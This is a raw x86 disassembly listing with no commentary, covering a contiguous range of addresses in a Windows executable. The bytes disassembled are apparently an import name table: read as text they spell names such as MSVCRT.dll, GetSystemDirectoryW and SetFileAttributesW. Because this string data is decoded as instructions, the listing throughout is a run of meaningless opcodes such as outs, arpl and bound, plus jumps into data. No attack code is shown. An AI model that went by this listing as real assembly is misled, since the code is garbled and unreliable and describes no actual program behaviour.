  4282ee:	jb     0x428359
  4282f0:	outs   dx,BYTE PTR ds:[esi]
  4282f1:	je     0x4282f3
  4282f3:	test   BYTE PTR [ebx],0x73
  4282f6:	je     0x42836a
  4282f8:	jb     0x42835d
  4282fa:	push   0xb30072
  4282ff:	pop    edi
  428300:	pop    edi
  428301:	jae    0x428368
  428303:	je     0x428364
  428305:	popa   
  428306:	jo     0x428378
  428308:	pop    edi
  428309:	je     0x428384
  42830b:	jo     0x428372
  42830d:	add    BYTE PTR [eax],al
  42830f:	mov    al,ds:0x705f5f00
  428314:	pop    edi
  428315:	pop    edi
  428316:	ins    WORD PTR es:[edi],dx
  428318:	outs   dx,DWORD PTR ds:[esi]
  428319:	fs add BYTE PTR gs:[eax],al
  42831d:	jge    0x428322
  42831f:	data16 jb 0x428387
  428322:	add    BYTE PTR gs:[eax],al
  428325:	fwait
  428326:	add    BYTE PTR [edi+0x5f],bl
  428329:	jo     0x42838a
  42832b:	pop    edi
  42832c:	arpl   WORD PTR [edi+0x6d],bp
  42832f:	ins    DWORD PTR es:[edi],dx
  428330:	outs   dx,DWORD PTR ds:[esi]
  428331:	fs add BYTE PTR gs:[eax],al
  428335:	and    eax,0x73637704
  42833a:	ins    BYTE PTR es:[edi],dx
  42833b:	outs   dx,BYTE PTR gs:[esi]
  42833d:	add    BYTE PTR [eax],al
  42833f:	and    DWORD PTR [edi+esi*2],eax
  428342:	arpl   WORD PTR [ebx+0x63],si
  428345:	jo     0x4283c0
  428347:	add    BYTE PTR [eax],al
  428349:	or     al,BYTE PTR [esp+esi*2]
  42834c:	outs   dx,DWORD PTR ds:[esi]
  42834d:	jne    0x4283bf
  42834f:	jo     0x4283b6
  428351:	jb     0x428353
  428353:	rol    BYTE PTR [ebx],cl
  428355:	jb     0x4283bc
  428357:	ins    DWORD PTR es:[edi],dx
  428358:	outs   dx,DWORD PTR ds:[esi]
  428359:	jbe    0x4283c0
  42835b:	add    BYTE PTR [eax],al
  42835d:	xchg   edi,eax
  42835e:	add    ebp,DWORD PTR [ecx+0x73]
  428361:	imul   esp,DWORD PTR fs:[edi+0x69],0x3ea0074
  428369:	jae    0x4283df
  42836b:	jb     0x4283d0
  42836d:	jae    0x4283df
  42836f:	outs   dx,BYTE PTR ds:[esi]
  428370:	add    BYTE PTR [edi+0x74656703],cl
  428376:	jae    0x428378
  428378:	add    bh,cl
  42837a:	add    esi,DWORD PTR [edx+0x61]
  42837d:	outs   dx,BYTE PTR ds:[esi]
  42837e:	add    BYTE PTR fs:[eax],al
  428381:	mov    ch,0x3
  428383:	ins    DWORD PTR es:[edi],dx
  428384:	popa   
  428385:	ins    BYTE PTR es:[edi],dx
  428386:	ins    BYTE PTR es:[edi],dx
  428387:	outs   dx,DWORD PTR ds:[esi]
  428388:	arpl   WORD PTR [eax],ax
  42838a:	add    al,cl
  42838c:	add    esi,DWORD PTR [eax+0x75]
  42838f:	je     0x4283f4
  428391:	push   0x1c007261
  428396:	add    al,0x77
  428398:	arpl   WORD PTR [ebx+0x63],si
  42839b:	popa   
  42839c:	je     0x42839e
  42839e:	add    BYTE PTR [eax+0x3],ah
  4283a1:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4283a5:	imul   eax,DWORD PTR [eax],0xffffffdb
  4283a8:	add    BYTE PTR [edi+0x61],bl
  4283ab:	ins    DWORD PTR es:[edi],dx
  4283ac:	jae    0x428415
  4283ae:	pop    edi
  4283af:	gs js  0x42841b
  4283b2:	je     0x4283b4
  4283b4:	add    BYTE PTR [edi+0x77736903],ah
  4283ba:	jo     0x42842e
  4283bc:	imul   ebp,DWORD PTR [esi+0x74],0x1860000
  4283c3:	pop    edi
  4283c4:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  4283cb:	ins    DWORD PTR es:[edi],dx
  4283cc:	add    bl,ch
  4283ce:	add    esi,DWORD PTR [ebx+0x74]
  4283d1:	jb     0x428438
  4283d3:	jb     0x428447
  4283d5:	outs   dx,DWORD PTR ds:[esi]
  4283d6:	jb     0x4283d8
  4283d8:	add    ch,bh
  4283da:	add    esi,DWORD PTR [ebx+0x74]
  4283dd:	jb     0x428453
  4283df:	outs   dx,DWORD PTR ds:[esi]
  4283e0:	jne    0x42844e
  4283e2:	add    bh,bh
  4283e4:	add    esi,DWORD PTR [ebx+0x77]
  4283e7:	jo     0x42845b
  4283e9:	imul   ebp,DWORD PTR [esi+0x74],0x9e000066
  4283f0:	add    DWORD PTR [edi+0x69],ebx
  4283f3:	jae    0x428462
  4283f5:	bound  esp,QWORD PTR [edx+0x6c]
  4283f8:	gs popa 
  4283fa:	add    BYTE PTR fs:[eax],al
  4283fd:	fld    DWORD PTR [ebx]
  4283ff:	jae    0x428466
  428401:	je     0x428479
  428403:	bound  esi,QWORD PTR [ebp+0x66]
  428406:	add    BYTE PTR ds:0x676e7504,cl
  42840c:	gs je  0x428472
  42840f:	add    BYTE PTR [eax],al
  428411:	push   edx
  428412:	add    BYTE PTR [edi+0x58],bl
  428415:	arpl   WORD PTR [eax+0x74],si
  428418:	inc    esi
  428419:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  428421:	pop    edi
  428422:	gs js  0x42848e
  428425:	je     0x428427
  428427:	in     eax,0x3
  428429:	jae    0x42849f
  42842b:	jb     0x428490
  42842d:	push   0xf2000072
  428432:	add    esi,DWORD PTR [ebx+0x74]
  428435:	jb     0x4284a5
  428437:	arpl   WORD PTR [eax+0x79],si
  42843a:	add    al,ch
  42843c:	add    BYTE PTR [edi+0x63],bl
  42843f:	gs js  0x4284ab
  428442:	je     0x428444
  428444:	add    BYTE PTR [ebp+0x3],ch
  428447:	data16 addr16 gs je 0x4284af
  42844c:	add    BYTE PTR ds:0x73637704,ch
  428452:	jb     0x4284b7
  428454:	push   0x4200072
  428459:	ja     0x4284be
  42845b:	jae    0x4284c0
  42845d:	outs   dx,DWORD PTR ds:[esi]
  42845e:	ins    BYTE PTR es:[edi],dx
  42845f:	ins    BYTE PTR es:[edi],dx
  428460:	add    cl,ah
  428462:	add    esi,DWORD PTR [ebx+0x73]
  428465:	arpl   WORD PTR [ecx+0x6e],sp
  428468:	data16 add BYTE PTR [eax],al
  42846b:	mov    ch,0x0
  42846d:	pop    edi
  42846e:	pop    edi
  42846f:	jae    0x4284d6
  428471:	je     0x4284e8
  428473:	jae    0x4284da
  428475:	jb     0x4284e4
  428477:	popa   
  428478:	je     0x4284e2
  42847a:	gs jb  0x4284ef
  42847d:	add    BYTE PTR [eax],al
  42847f:	mov    BYTE PTR [ebx],al
  428481:	data16 ja 0x4284f6
  428484:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7303f500
  42848c:	je     0x428500
  42848e:	jo     0x4284f2
  428490:	jb     0x4284fd
  428492:	add    ah,cl
  428494:	add    esi,DWORD PTR [ecx+0x73]
  428497:	outs   dx,DWORD PTR ds:[esi]
  428498:	jb     0x42850e
  42849a:	add    BYTE PTR [edx+0x0],dh
  42849d:	pop    edi
  42849e:	pop    edi
  42849f:	addr16 gs je 0x428510
  4284a3:	popa   
  4284a4:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4284ab:	cli    
  4284ac:	add    esi,DWORD PTR [ebx+0x74]
  4284af:	jb     0x428525
  4284b1:	outs   dx,DWORD PTR ds:[esi]
  4284b2:	imul   eax,DWORD PTR [eax],0x0
  4284b5:	dec    ebp
  4284b6:	push   ebx
  4284b7:	push   esi
  4284b8:	inc    ebx
  4284b9:	push   edx
  4284ba:	push   esp
  4284bb:	cs fs ins BYTE PTR es:[edi],dx
  4284be:	ins    BYTE PTR es:[edi],dx
  4284bf:	add    BYTE PTR [eax],al
  4284c1:	je     0x4284c5
  4284c3:	inc    edi
  4284c4:	gs je  0x42851c
  4284c7:	jae    0x42852e
  4284c9:	jb     0x42850f
  4284cb:	gs popaw 
  4284ce:	jne    0x42853c
  4284d0:	je     0x42851e
  4284d2:	popa   
  4284d3:	outs   dx,BYTE PTR ds:[esi]
  4284d4:	addr16 dec ecx
  4284d6:	inc    esp
  4284d7:	add    BYTE PTR [eax],al
  4284d9:	jnp    0x4284dc
  4284db:	inc    esi
  4284dc:	outs   dx,DWORD PTR ds:[esi]
  4284dd:	ins    BYTE PTR es:[edi],dx
  4284de:	fs push ebx
  4284e0:	je     0x428554
  4284e2:	imul   ebp,DWORD PTR [esi+0x67],0x4280057
  4284e9:	push   ebx
  4284ea:	gs je  0x42853d
  4284ed:	jb     0x428558
  4284ef:	outs   dx,DWORD PTR ds:[esi]
  4284f0:	jb     0x42855b
  4284f2:	je     0x42856d
  4284f4:	inc    ebx
  4284f5:	ins    BYTE PTR es:[edi],dx
  4284f6:	popa   
  4284f7:	jae    0x42856c
  4284f9:	add    BYTE PTR [eax],al
  4284fb:	pop    ebp
  4284fc:	add    DWORD PTR [esi+0x69],eax
  4284ff:	outs   dx,BYTE PTR ds:[esi]
  428500:	fs inc esi
  428502:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  428509:	gs inc ecx
  42850b:	add    BYTE PTR [eax],al
  42850d:	or     al,BYTE PTR [ebx]
  42850f:	dec    esp
  428510:	outs   dx,DWORD PTR ds:[esi]
  428511:	popa   
  428512:	fs push edx
  428514:	gs jae 0x428586
  428517:	jne    0x42858b
  428519:	arpl   WORD PTR [ebp+0x0],sp
  42851c:	add    BYTE PTR ds:0x74655304,bl
  428522:	dec    eax
  428523:	popa   
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	fs ins BYTE PTR es:[edi],dx
  428527:	gs inc ebx
  428529:	outs   dx,DWORD PTR ds:[esi]
  42852a:	jne    0x42859a
  42852c:	je     0x42852e
  42852e:	add    BYTE PTR [ecx+0x3],bl
  428531:	push   eax
  428532:	jne    0x4285a0
  428534:	jae    0x42859b
  428536:	inc    ebp
  428537:	jbe    0x42859e
  428539:	outs   dx,BYTE PTR ds:[esi]
  42853a:	je     0x42853c
  42853c:	add    BYTE PTR ds:0x74655304,dl
  428542:	inc    esi
  428543:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  42854b:	outs   dx,DWORD PTR ds:[esi]
  42854c:	dec    edi
  42854d:	inc    ebp
  42854e:	dec    ebp
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    al,BYTE PTR [edx]
  428553:	inc    edi
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	outs   dx,DWORD PTR ds:[esi]
  428556:	bound  esp,QWORD PTR [ecx+0x6c]
  428559:	inc    ebx
  42855a:	outs   dx,DWORD PTR ds:[esi]
  42855b:	ins    DWORD PTR es:[edi],dx
  42855c:	jo     0x4285bf
  42855e:	arpl   WORD PTR [eax+eax*1+0x9],si
  428562:	add    al,BYTE PTR [edi+0x65]
  428565:	je     0x4285b4
  428567:	outs   dx,DWORD PTR ds:[esi]
  428568:	fs jne 0x4285d7
  42856b:	gs inc esi
  42856d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  428575:	add    BYTE PTR [eax],al
  428577:	mov    eax,DWORD PTR [edx]
  428579:	inc    edi
  42857a:	ins    BYTE PTR es:[edi],dx
  42857b:	outs   dx,DWORD PTR ds:[esi]
  42857c:	bound  esp,QWORD PTR [ecx+0x6c]
  42857f:	inc    esp
  428580:	gs ins BYTE PTR es:[edi],dx
  428582:	gs je  0x4285ea
  428585:	inc    ecx
  428586:	je     0x4285f7
  428588:	ins    DWORD PTR es:[edi],dx
  428589:	add    BYTE PTR [eax],al
  42858b:	and    DWORD PTR [ebx+edx*2],eax
  42858e:	gs je  0x4285dd
  428591:	popa   
  428592:	jae    0x428608
  428594:	inc    ebp
  428595:	jb     0x428609
  428597:	outs   dx,DWORD PTR ds:[esi]
  428598:	jb     0x42859a
  42859a:	add    BYTE PTR [ebp+0x4],cl
  42859d:	push   ebx
  42859e:	ins    BYTE PTR es:[edi],dx
  42859f:	gs gs jo 0x4285a3
  4285a3:	inc    eax
  4285a4:	add    al,0x53
  4285a6:	gs je  0x4285fd
  4285a9:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4285b0:	jne    0x428617
  4285b2:	push   esp
  4285b3:	imul   ebp,DWORD PTR [ebp+0x65],0xf3000072
  4285ba:	add    al,0x56
  4285bc:	imul   esi,DWORD PTR [edx+0x74],0x556c6175
  4285c3:	outs   dx,BYTE PTR ds:[esi]
  4285c4:	ins    BYTE PTR es:[edi],dx
  4285c5:	outs   dx,DWORD PTR ds:[esi]
  4285c6:	arpl   WORD PTR [ebx+0x0],bp
  4285c9:	ret    
  4285ca:	add    al,0x6c
  4285cc:	jae    0x428642
  4285ce:	jb     0x428633
  4285d0:	ins    DWORD PTR es:[edi],dx
  4285d1:	jo     0x42862a
  4285d3:	add    BYTE PTR [eax],al
  4285d5:	dec    esp
  4285d6:	add    al,0x53
  4285d8:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  4285df:	jae    0x428650
  4285e1:	jne    0x428655
  4285e3:	arpl   WORD PTR [ebp+0x0],sp
  4285e6:	add    BYTE PTR [edx+0x74654701],cl
  4285ec:	inc    ecx
  4285ed:	inc    ebx
  4285ee:	push   eax
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	jno    0x4285f5
  4285f3:	inc    edi
  4285f4:	gs je  0x42864b
  4285f7:	imul   ebp,DWORD PTR [ebp+0x65],0x656e6f5a
  4285fe:	dec    ecx
  4285ff:	outs   dx,BYTE PTR ds:[esi]
  428600:	outs   dx,WORD PTR ds:[esi]
  428602:	jb     0x428671
  428604:	popa   
  428605:	je     0x428670
  428607:	outs   dx,DWORD PTR ds:[esi]
  428608:	outs   dx,BYTE PTR ds:[esi]
  428609:	add    BYTE PTR [eax],al
  42860b:	jae    0x42860f
  42860d:	inc    edi
  42860e:	gs je  0x428666
  428611:	jae    0x428678
  428613:	jb     0x428659
  428615:	gs popaw 
  428618:	jne    0x428686
  42861a:	je     0x428668
  42861c:	inc    ebx
  42861d:	dec    ecx
  42861e:	inc    esp
  42861f:	add    BYTE PTR [eax],al
  428621:	mov    al,0x3
  428623:	push   edx
  428624:	gs ins BYTE PTR es:[edi],dx
  428626:	gs popa 
  428628:	jae    0x42868f
  42862a:	push   ebx
  42862b:	gs ins DWORD PTR es:[edi],dx
  42862d:	popa   
  42862e:	jo     0x428698
  428630:	outs   dx,DWORD PTR ds:[esi]
  428631:	jb     0x428698
  428633:	add    BYTE PTR [eax],al
  428635:	ins    DWORD PTR es:[edi],dx
  428636:	add    al,BYTE PTR [edi+0x65]
  428639:	je     0x42868f
  42863b:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  428642:	je     0x428644
  428644:	add    dh,al
  428646:	add    al,0x6c
  428648:	jae    0x4286be
  42864a:	jb     0x4286af
  42864c:	ins    DWORD PTR es:[edi],dx
  42864d:	jo     0x4286b8
  42864f:	push   edi
  428650:	add    bl,bl
  428652:	add    cl,BYTE PTR [ecx+0x73]
  428655:	push   esi
  428656:	popa   
  428657:	ins    BYTE PTR es:[edi],dx
  428658:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  428660:	add    dl,al
  428662:	add    al,0x6c
  428664:	jae    0x4286da
  428666:	jb     0x4286cb
  428668:	ins    DWORD PTR es:[edi],dx
  428669:	jo     0x4286ac
  42866b:	add    BYTE PTR [eax],al
  42866d:	in     al,0x3
  42866f:	push   ebx
  428670:	gs je  0x4286b6
  428673:	outs   dx,DWORD PTR ds:[esi]
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	ins    DWORD PTR es:[edi],dx
  428676:	push   esp
  428677:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  42867e:	add    BYTE PTR [edx+0x65724601],al
  428684:	gs dec esp
  428686:	imul   esp,DWORD PTR [edx+0x72],0x797261
  42868d:	pop    DWORD PTR [edx]
  42868f:	inc    edi
  428690:	ins    BYTE PTR es:[edi],dx
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	bound  esp,QWORD PTR [ecx+0x6c]
  428695:	inc    esi
  428696:	ins    BYTE PTR es:[edi],dx
  428697:	popa   
  428698:	addr16 jae 0x42869b
  42869b:	into   
  42869c:	add    al,0x6c
  42869e:	jae    0x428714
  4286a0:	jb     0x42870e
  4286a2:	outs   dx,BYTE PTR gs:[esi]
  4286a4:	inc    ecx
  4286a5:	add    BYTE PTR [eax],al
  4286a7:	sbb    BYTE PTR [ebx+edx*2],al
  4286aa:	gs je  0x4286f3
  4286ad:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4286b5:	gs jb  0x4286b8
  4286b8:	add    BYTE PTR [eax+0x2],ah
  4286bb:	inc    edi
  4286bc:	gs je  0x428713
  4286bf:	gs ins DWORD PTR es:[edi],dx
  4286c1:	jo     0x428709
  4286c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4286cb:	add    BYTE PTR [eax],al
  4286cd:	sub    eax,0x6e694601
  4286d2:	fs inc ecx
  4286d4:	je     0x428745
  4286d6:	ins    DWORD PTR es:[edi],dx
  4286d7:	push   edi
  4286d8:	add    dl,ch
  4286da:	add    BYTE PTR [ebx+0x72],al
  4286dd:	gs popa 
  4286df:	je     0x428746
  4286e1:	push   ebx
  4286e2:	gs ins DWORD PTR es:[edi],dx
  4286e4:	popa   
  4286e5:	jo     0x42874f
  4286e7:	outs   dx,DWORD PTR ds:[esi]
  4286e8:	jb     0x42874f
  4286ea:	push   edi
  4286eb:	add    BYTE PTR [eax],al
  4286ed:	fadd   QWORD PTR [ebx]
  4286ef:	push   ebx
  4286f0:	gs popa 
  4286f2:	jb     0x428757
  4286f4:	push   0x68746150
  4286f9:	push   edi
  4286fa:	add    BYTE PTR [ebx+eax*1+0x4f],al
  4286fe:	jo     0x428765
  428700:	outs   dx,BYTE PTR ds:[esi]
  428701:	push   ebx
  428702:	gs ins DWORD PTR es:[edi],dx
  428704:	popa   
  428705:	jo     0x42876f
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jb     0x42876f
  42870a:	push   edi
  42870b:	add    BYTE PTR [eax],al
  42870d:	into   
  42870e:	add    cl,BYTE PTR [ecx+0x73]
  428711:	inc    edx
  428712:	popa   
  428713:	fs push edi
  428715:	jb     0x428780
  428717:	je     0x42877e
  428719:	push   eax
  42871a:	je     0x42878e
  42871c:	add    cl,dh
  42871e:	add    DWORD PTR [edi+0x65],eax
  428721:	je     0x428769
  428723:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  42872b:	xchg   edx,eax
  42872c:	add    al,BYTE PTR [edi+0x6c]
  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	bound  esp,QWORD PTR [ecx+0x6c]
  428733:	inc    edi
  428734:	gs je  0x428778
  428737:	je     0x4287a8
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	dec    esi
  42873b:	popa   
  42873c:	ins    DWORD PTR es:[edi],dx
  42873d:	gs push edi
  42873f:	add    BYTE PTR [eax],al
  428741:	mov    edi,0x74736c04
  428746:	jb     0x4287ab
  428748:	popa   
  428749:	je     0x42878c
  42874b:	add    BYTE PTR [eax],al
  42874d:	out    0x0,al
  42874f:	inc    ebx
  428750:	jb     0x4287b7
  428752:	popa   
  428753:	je     0x4287ba
  428755:	push   edx
  428756:	gs ins DWORD PTR es:[edi],dx
  428758:	outs   dx,DWORD PTR ds:[esi]
  428759:	je     0x4287c0
  42875b:	push   esp
  42875c:	push   0x64616572
  428761:	add    BYTE PTR [eax],al
  428763:	imul   eax,DWORD PTR [edx*2+0x6e61686e],0x64
  42876b:	ins    BYTE PTR es:[edi],dx
  42876c:	gs fs inc ebp
  42876f:	js     0x4287d4
  428771:	gs jo  0x4287e8
  428774:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  42877b:	gs jb  0x42877e
  42877e:	add    BYTE PTR [ebx+0x6d655203],dh
  428784:	outs   dx,DWORD PTR ds:[esi]
  428785:	jbe    0x4287ec
  428787:	inc    esp
  428788:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42878f:	jns    0x4287d2
  428791:	add    BYTE PTR [eax],al
  428793:	pop    edi
  428794:	add    al,BYTE PTR [edi+0x65]
  428797:	je     0x4287ed
  428799:	gs ins DWORD PTR es:[edi],dx
  42879b:	jo     0x4287e3
  42879d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4287a5:	add    BYTE PTR [eax],al
  4287a7:	out    0x0,eax
  4287a9:	inc    ebx
  4287aa:	jb     0x428811
  4287ac:	popa   
  4287ad:	je     0x428814
  4287af:	push   ebx
  4287b0:	gs ins DWORD PTR es:[edi],dx
  4287b2:	popa   
  4287b3:	jo     0x42881d
  4287b5:	outs   dx,DWORD PTR ds:[esi]
  4287b6:	jb     0x42881d
  4287b8:	inc    ecx
  4287b9:	add    BYTE PTR [eax],al
  4287bb:	in     al,dx
  4287bc:	add    DWORD PTR [edi+0x65],eax
  4287bf:	je     0x428807
  4287c1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4287c9:	bound  esi,QWORD PTR [ebp+0x74]
  4287cc:	gs jae 0x428826
  4287cf:	add    BYTE PTR [eax],al
  4287d1:	jmp    0x6946:0x74654701
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	gs inc ecx
  4287db:	je     0x428851
  4287dd:	jb     0x428848
  4287df:	bound  esi,QWORD PTR [ebp+0x74]
  4287e2:	gs jae 0x42882a
  4287e5:	js     0x428828
  4287e7:	add    BYTE PTR [eax],al
  4287e9:	nop
  4287ea:	add    al,BYTE PTR [edi+0x6c]
  4287ed:	outs   dx,DWORD PTR ds:[esi]
  4287ee:	bound  esp,QWORD PTR [ecx+0x6c]
  4287f1:	inc    esi
  4287f2:	jb     0x428859
  4287f4:	add    BYTE PTR gs:[eax],al
  4287f7:	inc    ebp
  4287f8:	add    al,BYTE PTR [edi+0x65]
  4287fb:	je     0x428850
  4287fd:	je     0x428860
  4287ff:	jb     0x428875
  428801:	jne    0x428873
  428803:	dec    ecx
  428804:	outs   dx,BYTE PTR ds:[esi]
  428805:	outs   dx,WORD PTR ds:[esi]
  428807:	push   edi
  428808:	add    BYTE PTR [ecx+0x6f6c4702],dl
  42880e:	bound  esp,QWORD PTR [ecx+0x6c]
  428811:	inc    edi
  428812:	gs je  0x428856
  428815:	je     0x428886
  428817:	ins    DWORD PTR es:[edi],dx
  428818:	dec    esi
  428819:	popa   
  42881a:	ins    DWORD PTR es:[edi],dx
  42881b:	gs inc ecx
  42881d:	add    BYTE PTR [eax],al
  42881f:	mov    ds:0x6c614300,al
  428824:	ins    BYTE PTR es:[edi],dx
  428825:	dec    esi
  428826:	popa   
  428827:	ins    DWORD PTR es:[edi],dx
  428828:	gs fs push eax
  42882b:	imul   esi,DWORD PTR [eax+0x65],0xf3000057
  428832:	add    DWORD PTR [edi+0x65],eax
  428835:	je     0x42887d
  428837:	jne    0x4288a5
  428839:	ins    BYTE PTR es:[edi],dx
  42883a:	push   eax
  42883b:	popa   
  42883c:	je     0x4288a6
  42883e:	dec    esi
  42883f:	popa   
  428840:	ins    DWORD PTR es:[edi],dx
  428841:	gs push edi
  428843:	add    BYTE PTR [eax],al
  428845:	xchg   DWORD PTR [edx],eax
  428847:	inc    edi
  428848:	ins    BYTE PTR es:[edi],dx
  428849:	outs   dx,DWORD PTR ds:[esi]
  42884a:	bound  esp,QWORD PTR [ecx+0x6c]
  42884d:	inc    ecx
  42884e:	fs fs inc ecx
  428851:	je     0x4288c2
  428853:	ins    DWORD PTR es:[edi],dx
  428854:	inc    ecx
  428855:	add    BYTE PTR [eax],al
  428857:	dec    ebx
  428858:	inc    ebp
  428859:	push   edx
  42885a:	dec    esi
  42885b:	inc    ebp
  42885c:	dec    esp
  42885d:	xor    esi,DWORD PTR [edx]
  42885f:	cs fs ins BYTE PTR es:[edi],dx
  428862:	ins    BYTE PTR es:[edi],dx
  428863:	add    BYTE PTR [eax],al
  428865:	sahf   
  428866:	add    DWORD PTR [ecx+0x73],ecx
  428869:	push   edx
  42886a:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  42886f:	jo     0x4288e5
  428871:	jns    0x428873
  428873:	mov    DWORD PTR [ecx],eax
  428875:	dec    ecx
  428876:	outs   dx,BYTE PTR ds:[esi]
  428877:	jbe    0x4288da
  428879:	ins    BYTE PTR es:[edi],dx
  42887a:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  428882:	je     0x428884
  428884:	add    ch,dh
  428886:	add    BYTE PTR [edi+0x65],al
  428889:	je     0x4288ce
  42888b:	ins    BYTE PTR es:[edi],dx
  42888c:	popa   
  42888d:	jae    0x428902
  42888f:	dec    ecx
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	outs   dx,WORD PTR ds:[esi]
  428893:	inc    ebp
  428894:	js     0x4288d7
  428896:	add    al,ah
  428898:	add    BYTE PTR [esi+0x69],al
  42889b:	ins    BYTE PTR es:[edi],dx
  42889c:	ins    BYTE PTR es:[edi],dx
  42889d:	push   edx
  42889e:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4288a3:	jl     0x4288a7
  4288a5:	push   ebx
  4288a6:	push   0x774f776f
  4288ab:	outs   dx,BYTE PTR ds:[esi]
  4288ac:	gs fs push eax
  4288af:	outs   dx,DWORD PTR ds:[esi]
  4288b0:	jo     0x428927
  4288b2:	jo     0x428927
  4288b4:	add    ch,al
  4288b6:	add    DWORD PTR [ebp+0x61],ecx
  4288b9:	jo     0x428911
  4288bb:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  4288c2:	gs jns 0x428906
  4288c5:	add    BYTE PTR [eax],al
  4288c7:	test   al,0x1
  4288c9:	dec    esp
  4288ca:	outs   dx,DWORD PTR ds:[esi]
  4288cb:	popa   
  4288cc:	fs inc ecx
  4288ce:	arpl   WORD PTR [ebx+0x65],sp
  4288d1:	ins    BYTE PTR es:[edi],dx
  4288d2:	gs jb  0x428936
  4288d5:	je     0x428946
  4288d7:	jb     0x42894c
  4288d9:	push   edi
  4288da:	add    BYTE PTR [edi+0x616f4c01],ch
  4288e0:	fs dec ecx
  4288e2:	arpl   WORD PTR [edi+0x6e],bp
  4288e5:	inc    ecx
  4288e6:	add    BYTE PTR [eax+0x1],bl
  4288e9:	inc    edi
  4288ea:	gs je  0x428940
  4288ed:	jne    0x428951
  4288ef:	dec    ebp
  4288f0:	outs   dx,BYTE PTR gs:[esi]
  4288f2:	jne    0x4288f4
  4288f4:	add    bl,al
  4288f6:	add    BYTE PTR [ebp+0x6e],al
  4288f9:	fs inc esp
  4288fb:	imul   esp,DWORD PTR [ecx+0x6c],0x3300676f
  428902:	add    BYTE PTR [ebx+0x68],al
  428905:	popa   
  428906:	jb     0x42895c
  428908:	outs   dx,DWORD PTR ds:[esi]
  428909:	dec    edi
  42890a:	gs ins DWORD PTR es:[edi],dx
  42890c:	inc    edx
  42890d:	jne    0x428975
  42890f:	inc    cx
  428911:	add    BYTE PTR [eax],al
  428913:	pop    ecx
  428914:	add    DWORD PTR [edi+0x65],eax
  428917:	je     0x42896c
  428919:	jns    0x42898e
  42891b:	inc    ebx
  42891c:	outs   dx,DWORD PTR ds:[esi]
  42891d:	ins    BYTE PTR es:[edi],dx
  42891e:	outs   dx,DWORD PTR ds:[esi]
  42891f:	jb     0x428921
  428921:	mov    es,WORD PTR [edx]
  428923:	push   esp
  428924:	outs   dx,DWORD PTR ds:[esi]
  428925:	push   ebp
  428926:	outs   dx,BYTE PTR ds:[esi]
  428927:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  42892e:	add    BYTE PTR ds:0x6c6c4100,al
  428934:	outs   dx,DWORD PTR ds:[esi]
  428935:	ja     0x42898a
  428937:	gs je  0x428980
  42893a:	outs   dx,DWORD PTR ds:[esi]
  42893b:	jb     0x4289a2
  42893d:	addr16 jb 0x4289af
  428940:	jne    0x4289b0
  428942:	fs push edi
  428944:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  42894b:	mov    BYTE PTR [ecx],al
  42894d:	dec    ecx
  42894e:	outs   dx,BYTE PTR ds:[esi]
  42894f:	je     0x4289b6
  428951:	jb     0x4289c6
  428953:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  428958:	arpl   WORD PTR [eax+eax*1+0x1],si
  42895c:	add    BYTE PTR [ecx+0x63],al
  42895f:	je     0x4289ca
  428961:	jbe    0x4289c4
  428963:	je     0x4289ca
  428965:	dec    ebx
  428966:	gs jns 0x4289cb
  428969:	outs   dx,DWORD PTR ds:[esi]
  42896a:	popa   
  42896b:	jb     0x4289d1
  42896d:	dec    esp
  42896e:	popa   
  42896f:	jns    0x4289e0
  428971:	jne    0x4289e7
  428973:	add    BYTE PTR [eax],al
  428975:	out    dx,al
  428976:	add    DWORD PTR [eax+0x65],edx
  428979:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  42897e:	jae    0x4289e1
  428980:	addr16 gs inc ecx
  428983:	add    BYTE PTR [eax],al
  428985:	add    eax,DWORD PTR [eax]
  428987:	inc    ecx
  428988:	fs push 0x75
  42898b:	jae    0x428a01
  42898d:	push   edi
  42898e:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428995:	arpl   WORD PTR [ebp+eax*2+0x78],si
  428999:	add    BYTE PTR [eax],al
  42899b:	cmp    al,0x1
  42899d:	inc    edi
  42899e:	gs je  0x4289ee
  4289a1:	gs jae 0x428a17
  4289a4:	popa   
  4289a5:	addr16 gs push eax
  4289a8:	outs   dx,DWORD PTR ds:[esi]
  4289a9:	jae    0x4289ab
  4289ab:	push   ecx
  4289ac:	add    dl,BYTE PTR [ebx+0x65]
  4289af:	je     0x428a01
  4289b1:	popa   
  4289b2:	jb     0x428a19
